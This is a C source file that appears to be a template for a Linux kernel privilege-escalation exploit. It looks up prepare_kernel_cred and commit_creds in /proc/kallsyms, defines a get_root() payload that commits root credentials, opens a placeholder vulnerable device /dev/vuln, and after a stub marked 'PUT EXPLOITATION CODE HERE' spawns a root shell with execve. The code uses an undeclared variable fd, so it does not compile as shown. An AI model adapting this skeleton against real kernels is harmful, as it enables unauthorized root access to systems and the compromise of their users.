#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

struct cred;
struct task_struct;
 
typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));

prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;
 
void get_root() 
{
	if (commit_creds && prepare_kernel_cred)
	{
		commit_creds(prepare_kernel_cred(0));
	}
}

unsigned long get_kernel_sym(char *name)
{
  FILE *f;
  unsigned long addr;
  char dummy;
  char sname[256];
  int ret = 0;
 
	f = fopen("/proc/kallsyms", "r");
  	if (f == NULL)
 	{
		printf("[-] Failed to open /proc/kallsyms\n");
 		exit(-1);
 	}
 
	printf("[+] Find %s...\n", name);
  
	while(ret != EOF)
 	{
 		ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
    if (ret == 0)
		{
      fscanf(f, "%s\n", sname);
      continue;
    }
    if (!strcmp(name, sname))
		{
      fclose(f);
      printf("[+] Found %s at %lx\n", name, addr);
      return addr;
    }
  }

  fclose(f);
  return 0;
}


int main()
{
 
  prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym("prepare_kernel_cred");
  commit_creds = (commit_creds_t)get_kernel_sym("commit_creds");

	/* IF VULNERABLE DRIVER*/
	if ((fd = open("/dev/vuln", O_RDWR)) < 0) 
	{
		printf("Can't open device file: /dev/vuln\n");
    exit(1);
  }

	/*
		PUT EXPLOITATION CODE HERE 
	*/

	if(getuid())
	{
		perror("[-] Something went wrong\n");
    return -1;
  }

	execve("/bin/sh", NULL, NULL); 

	return 0; 
}


